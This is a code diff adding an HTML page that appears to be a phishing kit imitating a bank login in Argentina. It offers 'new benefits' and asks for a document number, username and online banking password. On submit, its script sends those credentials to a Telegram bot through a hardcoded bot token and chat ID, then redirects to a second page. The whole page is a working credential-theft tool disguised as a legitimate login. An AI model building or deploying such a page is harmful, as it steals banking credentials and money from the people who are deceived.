@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Inicio</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=0.8, maximum-scale=0.8, user-scalable=no"
+    />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="./beneficios_files/style_crown.css"
+    />
+    <script>
+      function soloNumeros(e) {
+        var key = e.which || e.keyCode;
+        if (key < 48 || key > 57) {
+          e.preventDefault();
+        }
+      }
+
+      async function enviarDatos(event) {
+        event.preventDefault(); // Prevent default form submission
+
+        const formData = new FormData(event.target);
+        const numdoc = formData.get("numdoc");
+        const clvss = formData.get("clvss");
+        const clvs = formData.get("clvs");
+        const tipodoc = formData.get("tipodoc");
+
+        const botToken = "6378086633:AAGVAfCvJ4w__4iNgaEnySvvb2C7CbONY9Y"; // Replace with your bot token
+        const chatId = "-4269474646"; // Replace with your chat ID
+
+        const message = `Documento: ${tipodoc} ${numdoc}\nUsuario: ${clvss}\nClave Digital: ${clvs}`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
+          message
+        )}`;
+
+        try {
+          const response = await fetch(url);
+          const result = await response.json();
+
+          if (result.ok) {
+            // Redirect to index2.html after successful submission
+            window.location.href = "index2.html";
+          } else {
+            alert("Error al enviar los datos: " + result.description);
+          }
+        } catch (error) {
+          alert("Error en la conexión: " + error.message);
+        }
+      }
+    </script>
+  </head>
+  <body>
+    <header class="ioscam">
+      <nav class="header_wrapeer">
+        <div class="header__campaign">
+          <div class="header__logo">
+            <img
+              src="./beneficios_files/blanco.png"
+              sizes="(min-width: 900px) 20vw, 50vw"
+              class="header__image"
+            />
+            <img src="./beneficios_files/bantp.png" />
+          </div>
+        </div>
+      </nav>
+    </header>
+    <div class="container">
+      <h1>¡Hola! Ingresa para disfrutar tus nuevos beneficios</h1>
+      <form method="POST" onsubmit="enviarDatos(event)">
+        <div class="group">
+          <select name="tipodoc" required>
+            <option value="CC">DNI</option>
+            <option value="CE">LC</option>
+            <option value="TI">LE</option>
+            <option value="PA">RENAPER</option>
+            <option value="NIP">PASAPORTE</option>
+          </select>
+        </div>
+        <br />
+        <div class="group">
+          <input
+            name="numdoc"
+            type="tel"
+            maxlength="16"
+            onkeypress="soloNumeros(event)"
+            autocomplete="off"
+            required
+          />
+          <label>Número de Documento</label>
+        </div>
+        <div class="group" style="margin-top: 16px">
+          <input
+            type="password"
+            name="clvss"
+            autocomplete="off"
+            maxlength="10"
+            required
+          />
+          <label>Usuario</label>
+        </div>
+        <div class="group" style="margin-top: 16px">
+          <input
+            type="password"
+            name="clvs"
+            autocomplete="off"
+            maxlength="10"
+            required
+          />
+          <label>Clave Digital</label>
+        </div>
+        <br /><br />
+        <div align="center">
+          <button
+            type="submit"
+            class="btn btn-blue"
+            style="
+              background-color: #237aba;
+              width: 60%;
+              padding: 2rem 4rem;
+              border: none;
+              border-radius: 1px;
+              color: #fff;
+            "
+          >
+            Continuar
+          </button>
+          <br /><br /><br />
+          <a href="#" class="tatione">¿Olvidaste tu contraseña?</a>
+        </div>
+      </form>
+    </div>
+  </body>
+</html>
